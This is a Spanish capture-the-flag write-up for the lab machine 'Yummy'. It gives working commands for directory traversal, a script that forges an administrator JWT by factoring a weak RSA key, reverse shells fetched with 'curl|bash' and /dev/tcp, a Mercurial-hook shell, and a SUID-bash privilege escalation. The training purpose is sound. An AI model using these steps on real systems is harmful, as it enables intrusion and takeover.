# Yummy

**Sistema Operativo**: Linux

**Dificultad**: Difícil

**Técnicas Vistas**: Web Enumeration /
JWT Enumeration /
Directory Traversal + Local File Inclusion /
Abusing Cryptographic Key Generation /
Breaking JWT Cryptography to Forge an Admin Token /
SQL Injection: Playing with extractvalue() to Enumerate Database Information [Manual Exploitation] /
SQL Injection + INTO OUTFILE + Abusing Cron Jobs for RCE /
Information Leakage /
Exploiting Sudoers Privileges and Mercurial Hooks to Execute Commands as Another User /
Abusing Sudoers privilege (rsync) [Privilege Escalation]

Te prepara para las **Certificaciones**: eWPT eWPTXv2 OSWE<br><br>

![image](https://github.com/user-attachments/assets/db1ecf01-55d7-4790-b67e-a2d93b28335d)<br><br>

# Reconocimiento

Utilizando `nmap` encontramos los puertos abiertos<br>


![Image](https://github.com/user-attachments/assets/866b6c3f-20bf-4c6d-b1d1-78da4697551a)<br><br>

Encontramos el nombre de dominio `yummy.htb`<br>

![Image](https://github.com/user-attachments/assets/f97fc556-8ab1-4f09-b835-695e3684a98f)<br><br>

Lo ponemos en `/etc/hosts`<br>

![Image](https://github.com/user-attachments/assets/38da0d21-467e-4cd7-b0f9-65c5add4ae14)<br><br>


Interceptamos con `Burpsuite` el "Save Icalendar"

![Image](https://github.com/user-attachments/assets/187ce621-75c7-4407-bcd7-f1c4585bc760)<br><br>


Hacemos un `Directory traversal`, los usuarios son "root, dev, qa"

![Image](https://github.com/user-attachments/assets/a54c3a84-5de0-48c8-b55c-af4b9b71f4de)<br><br>

Hacemos `/etc/crontab` y vemos estas tareas cron.

```
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```


##### Investigamos cada una de esas rutas.

`/data/scripts/app_backup.sh` ->

![Image](https://github.com/user-attachments/assets/b567bf1a-19a1-46a3-9e96-a27261655b2f)<br><br>

`/bin/bash /data/scripts/table_cleanup.sh` ->

![Image](https://github.com/user-attachments/assets/9e07a63c-9638-41ef-8080-f3f9b8d02682)<br><br>

`/bin/bash /data/scripts/dbmonitor.sh` ->

![Image](https://github.com/user-attachments/assets/4dca3b30-d980-4eaa-9bf9-04aa9c9e2762)<br><br>

##### Descargamos el backupapp.zip

```
curl -s --cookie 'X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhbnRpQHNhbnRpLmNvbSIsInJvbGUiOiJjdXN0b21lcl9kYzgwYWNmNSIsImlhdCI6MTc0MTI4NTg3OSwiZXhwIjoxNzQxMjg5NDc5LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1ODE2OTgxMTM5MDY1OTQyOTMzNzI2MDA5MDIzOTcyODMwOTYyMjE4NjEyMzU2NzMwNzAzMzQ3MTA1NDE1MjI4NzAyNTQzMjU1MTM2NjE4NTY5NDkwMzYyNTk5MjQwODM2ODYyNzMxMzI1MjAzMTk5OTM5MjcwMDI2MzI0NTYyMjEzMzYzNzAzMDYxNjAwMDY1OTcyMDczNjI3MTIzNTMyOTgwMjczNzk4MjE4MzMwNjU3Mjk4MTM3NTI2NTU5NjM1MDM0NTE3Nzc5MzExNzQ4MjU2MDk0ODk2ODYxMDE4Nzk2MzIyMDY4OTE2NDk1MzQ1NzU3OTAyNjU3MjEwNDA0NDA3MTIyNDk5MjMyMjA1NTY3NTQyMTgzNjUwMzY5MTY0MzkwNTAxNTg4NjQ2NjU1MDYxOTk5Njk2MyIsImUiOjY1NTM3fX0.DSLArggk4JYbfcXMb9aQMgevnKszoKRmQLb2HM_zAdHZgKCd2gEg3y1ycGVen6W6Yf0XKrNGRwgfUs5dYSF7tGFozG_-MNkgqG4hxeHLaS1iO57ZASFQCNqyKQhO_qjugG4IfdETH0SM5x2t5b8VXXn4EA21XX6jHVl2mbmt9hoPQOU; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.Z8nxqQ.cfZDC1njqeunbLLyqkfoZiCQROU' -X GET 'http://yummy.htb/export/../../../../../var/www/backupapp.zip' --path-as-is --output backupapp.zip
```


Este es el archivo que nos interesa, acá  es donde se crea el jwt:<br>

![Image](https://github.com/user-attachments/assets/d99f419d-8e4f-4e58-9a86-68e9b86a104c)<br><br>


# RSA

##### Script RSA sacando "n" y "e", solucionando el error de padding

```
#!/usr/bin/python3

import json
from base64 import b64decode
from pwn import *

token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imx1Y2t5QGx1Y2t5LmNvbSIsInJvbGUiOiJjdXN0b21lcl82NDhiOWE3MSIsImlhdCI6MTc0MTI3NTcyOSwiZXhwIjoxNzQxMjc5MzI5LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1ODE2OTgxMTM5MDY1OTQyOTMzNzI2MDA5MDIzOTcyODMwOTYyMjE4NjEyMzU2NzMwNzAzMzQ3MTA1NDE1MjI4NzAyNTQzMjU1MTM2NjE4NTY5NDkwMzYyNTk5MjQwODM2ODYyNzMxMzI1MjAzMTk5OTM5MjcwMDI2MzI0NTYyMjEzMzYzNzAzMDYxNjAwMDY1OTcyMDczNjI3MTIzNTMyOTgwMjczNzk4MjE4MzMwNjU3Mjk4MTM3NTI2NTU5NjM1MDM0NTE3Nzc5MzExNzQ4MjU2MDk0ODk2ODYxMDE4Nzk2MzIyMDY4OTE2NDk1MzQ1NzU3OTAyNjU3MjEwNDA0NDA3MTIyNDk5MjMyMjA1NTY3NTQyMTgzNjUwMzY5MTY0MzkwNTAxNTg4NjQ2NjU1MDYxOTk5Njk2MyIsImUiOjY1NTM3fX0.CDv3Nq6cbSHyf-nKph-DOht_0bogglmq9zHTsbP5qPjkUEYriKpIw8ie6quw05yusJUhbYUkZhAVQVdTqyVsXljKbO_L9aDDrbi4A9bbejAy7JdblRv8CBLEo-DZYNq0-WM_PJYVvH0RdmJaCbPh2EW0U8NCgh3gZBzZ1PKSqodfqDc'

token_part = token.split('.')[1]

padding = '=' * (4 - len(token_part) % 4)
token_part += padding

e = json.loads(b64decode(token_part).decode())["jwk"]["e"]

n = json.loads(b64decode(token_part).decode())["jwk"]["n"]

log.info(f"n: {n}")

log.info(f"e: {e}")

```

Factorizamos "N" -> https://factordb.com

Obtenemos P y Q 

p = 991663
q = 159499559215841903284946690800935710641806867420995876090016620855094354182183045747298856559545297774862278850778331651239630420953123218891902450450139080751555521117539106840300567204045725564375375296968307339236180648252443845025139541817713302373996049132845525467881402675945864362836876051528055953101
<br><br>
##### Modificamos el Script Signature.py

```
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import jwt
import json
from base64 import b64decode
from pwn import *


token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhbnRpQHNhbnRpLmNvbSIsInJvbGUiOiJjdXN0b21lcl8wMWJlMGI4MiIsImlhdCI6MTc0MTI4NDAxOCwiZXhwIjoxNzQxMjg3NjE4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1ODE2OTgxMTM5MDY1OTQyOTMzNzI2MDA5MDIzOTcyODMwOTYyMjE4NjEyMzU2NzMwNzAzMzQ3MTA1NDE1MjI4NzAyNTQzMjU1MTM2NjE4NTY5NDkwMzYyNTk5MjQwODM2ODYyNzMxMzI1MjAzMTk5OTM5MjcwMDI2MzI0NTYyMjEzMzYzNzAzMDYxNjAwMDY1OTcyMDczNjI3MTIzNTMyOTgwMjczNzk4MjE4MzMwNjU3Mjk4MTM3NTI2NTU5NjM1MDM0NTE3Nzc5MzExNzQ4MjU2MDk0ODk2ODYxMDE4Nzk2MzIyMDY4OTE2NDk1MzQ1NzU3OTAyNjU3MjEwNDA0NDA3MTIyNDk5MjMyMjA1NTY3NTQyMTgzNjUwMzY5MTY0MzkwNTAxNTg4NjQ2NjU1MDYxOTk5Njk2MyIsImUiOjY1NTM3fX0.DFgK32P8PxGhPU7wlanabvlT05dwAj0YKlRtPGc0Y-KdQBAB25yjtCtI7NT1WBR625wML3aHmIUVvZ-DjV4rFmisJkxvlAmbLbapZgGnXmIJHMXbdKB4CQ2uMTerP4w7-bwWjnYfNm8GkopPQc0pxJFiJdgSCnkSpERDvNjfFwadldc"

token_part = token.split('.')[1]

padding = '=' * (4 - len(token_part) % 4)
token_part += padding

n = int(json.loads(b64decode(token_part).decode())["jwk"]["n"])

p = 991663

q = 159499559215841903284946690800935710641806867420995876090016620855094354182183045747298856559545297774862278850778331651239630420953123218891902450450139080751555521117539106840300567204045725564375375296968307339236180648252443845025139541817713302373996049132845525467881402675945864362836876051528055953101

# Generate RSA key pair
e = 65537
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

data = jwt.decode(token, public_key, algorithms=["RS256"])

print(data)
```

Si nos devuelve esto, quiere decir que funciono:

![Image](https://github.com/user-attachments/assets/c9f8d9f0-693c-46d3-8e14-ed3eee4140ae)<br><br>

##### Agregamos esto el "role"  administrador y el "new_token":

```
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import jwt
import json
from base64 import b64decode
from pwn import *


token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhbnRpQHNhbnRpLmNvbSIsInJvbGUiOiJjdXN0b21lcl8wMWJlMGI4MiIsImlhdCI6MTc0MTI4NDAxOCwiZXhwIjoxNzQxMjg3NjE4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1ODE2OTgxMTM5MDY1OTQyOTMzNzI2MDA5MDIzOTcyODMwOTYyMjE4NjEyMzU2NzMwNzAzMzQ3MTA1NDE1MjI4NzAyNTQzMjU1MTM2NjE4NTY5NDkwMzYyNTk5MjQwODM2ODYyNzMxMzI1MjAzMTk5OTM5MjcwMDI2MzI0NTYyMjEzMzYzNzAzMDYxNjAwMDY1OTcyMDczNjI3MTIzNTMyOTgwMjczNzk4MjE4MzMwNjU3Mjk4MTM3NTI2NTU5NjM1MDM0NTE3Nzc5MzExNzQ4MjU2MDk0ODk2ODYxMDE4Nzk2MzIyMDY4OTE2NDk1MzQ1NzU3OTAyNjU3MjEwNDA0NDA3MTIyNDk5MjMyMjA1NTY3NTQyMTgzNjUwMzY5MTY0MzkwNTAxNTg4NjQ2NjU1MDYxOTk5Njk2MyIsImUiOjY1NTM3fX0.DFgK32P8PxGhPU7wlanabvlT05dwAj0YKlRtPGc0Y-KdQBAB25yjtCtI7NT1WBR625wML3aHmIUVvZ-DjV4rFmisJkxvlAmbLbapZgGnXmIJHMXbdKB4CQ2uMTerP4w7-bwWjnYfNm8GkopPQc0pxJFiJdgSCnkSpERDvNjfFwadldc"

token_part = token.split('.')[1]

padding = '=' * (4 - len(token_part) % 4)
token_part += padding

n = int(json.loads(b64decode(token_part).decode())["jwk"]["n"])

p = 991663

q = 159499559215841903284946690800935710641806867420995876090016620855094354182183045747298856559545297774862278850778331651239630420953123218891902450450139080751555521117539106840300567204045725564375375296968307339236180648252443845025139541817713302373996049132845525467881402675945864362836876051528055953101

# Generate RSA key pair
e = 65537
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

data = jwt.decode(token, public_key, algorithms=["RS256"])
data["role"] = 'administrator'

new_token = jwt.encode(data, private_key, algorithm="RS256")

print(new_token)
```

`python3 signature.py` -> Ejecuto y me da el nuevo token

`eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhbnRpQHNhbnRpLmNvbSIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzQxMjg0MDE4LCJleHAiOjE3NDEyODc2MTgsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTU4MTY5ODExMzkwNjU5NDI5MzM3MjYwMDkwMjM5NzI4MzA5NjIyMTg2MTIzNTY3MzA3MDMzNDcxMDU0MTUyMjg3MDI1NDMyNTUxMzY2MTg1Njk0OTAzNjI1OTkyNDA4MzY4NjI3MzEzMjUyMDMxOTk5MzkyNzAwMjYzMjQ1NjIyMTMzNjM3MDMwNjE2MDAwNjU5NzIwNzM2MjcxMjM1MzI5ODAyNzM3OTgyMTgzMzA2NTcyOTgxMzc1MjY1NTk2MzUwMzQ1MTc3NzkzMTE3NDgyNTYwOTQ4OTY4NjEwMTg3OTYzMjIwNjg5MTY0OTUzNDU3NTc5MDI2NTcyMTA0MDQ0MDcxMjI0OTkyMzIyMDU1Njc1NDIxODM2NTAzNjkxNjQzOTA1MDE1ODg2NDY2NTUwNjE5OTk2OTYzIiwiZSI6NjU1Mzd9fQ.DMUoz_SqtZTx_wttQuvaKANgzS33WLIjb3PRMX5zbFkykCAsFECKSxHF653YYD1UT1xMzSsLxEQgEockBUjCb7qhZ2onGGweFvT1ci18R0h-slZUz44P381eLcirf3qYWuEncvPo9_6X0vPmTVb7TlqsIAMx2zOvsTyuiwy9RoQSsOE`

Lo pego, recargo pagina, y ya soy administrador:

![Image](https://github.com/user-attachments/assets/934e2172-f8e2-4168-84a1-988baaca4f35)<br><br>

# SQLI

Este archivo lo ejecuta "mysql" cada minuto.

![Image](https://github.com/user-attachments/assets/37a6a860-00c4-4ad8-968f-ef9c4434cf0f)<br><br>

Creamos un `index.html` que contiene esto:

```
#!/bin/bash

bash >& /dev/tcp/10.10.14.20/443 0>&1
```

Hacemos `curl 10.10.14.20|bash` para que cuando se ejecute el "/data/scripts/fixer-v*", gane acceso a la maquina, compartiendo con `python3 -m http.server 80`  el `index.html`, y escuchando por el puerto 443 `nc -nlvp 443` para obtener acceso.

![Image](https://github.com/user-attachments/assets/f289efdb-1dfa-4be5-8566-c76a0c7a7dbf)<br><br>


# Escalada de privilegios

### Convertirnos en www-data siendo mysql

En la ruta `/data/scripts/`

`rm -rf app_backup.sh` -> Borro el archivo.
`vim app_backup.sh` -> Lo creo
```
#!/bin/bash

curl 10.10.14.8|bash
```
-> El contenido

`python3 -m http.server 80` -> En mi maquina de atacante comparto un `index.html` que con tiene -> 
```
#!/bin/bash

bash >& /dev/tcp/10.10.14.8/443 0>&1
```

`nc -nlvp 443` -> y me pongo en escucha por el puerto 443.

----
<br><br>
### Pasar de "www-data" a "qa"

Vemos el `hg` que funciona parecido a `git` donde podemos ver logs.

![Image](https://github.com/user-attachments/assets/d97582c6-92b0-4351-85de-7e927e819f9c)<br><br>

`hg log` -> Vemos los logs.

`hg diff -c f3787cac6111` -> Vemos la contraseña de "qa"

![Image](https://github.com/user-attachments/assets/9a3bc929-43d3-49f9-8ddc-10b6987ade5d)<br><br>

`jPAd!XQCtn8Oc@2B`

---
<br><br>
### Pasar de "qa" a "dev"

`sudo -l` 

Podemos ejecutar como dev la siguiente cadena:

![Image](https://github.com/user-attachments/assets/df95b872-b0b5-4bbf-9493-66737070ebb2)<br><br>

Vamos al directorio `/tmp/`.
Creamos un `mkdir .hg` le damos todos los permisos `chmod 777 .hg`.
Le pasamos el ".hgrc" `cp /home/qa/.hgrc .hg/hgrc`.
En el directorio `/tmp` creamos un script `exploit.sh` que contenga una esto -> 
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.8/443 0>&1
```
Damos permisos de ejecución  `chmod -x exploit.sh`.

En el `hgrc` agregamos abajo de todo lo siguiente ->

```
[hooks]
changegroup.update = /tmp/exploit.sh
```

Ejecutamos el comando ->
`sudo -u dev /usr/bin/hg pull /home/dev/app-production/`

---
<br><br>
### Pasar de "dev" a "root"

`sudo -l` vemos:

![Image](https://github.com/user-attachments/assets/17c5aef2-1078-43a0-aa39-ea2c5d3d192e)

En `/home/dev/app-production` hacemos:
`cp /bin/bash .` -> Copiamos y pegamos la bash.
`chmod u+s bash` -> Le damos permisos SUID. 
`sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/` -> Transformamos la bash SUID del usuario "dev" al usuario "root".
`/opt/app/bash -p` -> Nos da una bash privilegiada como root.

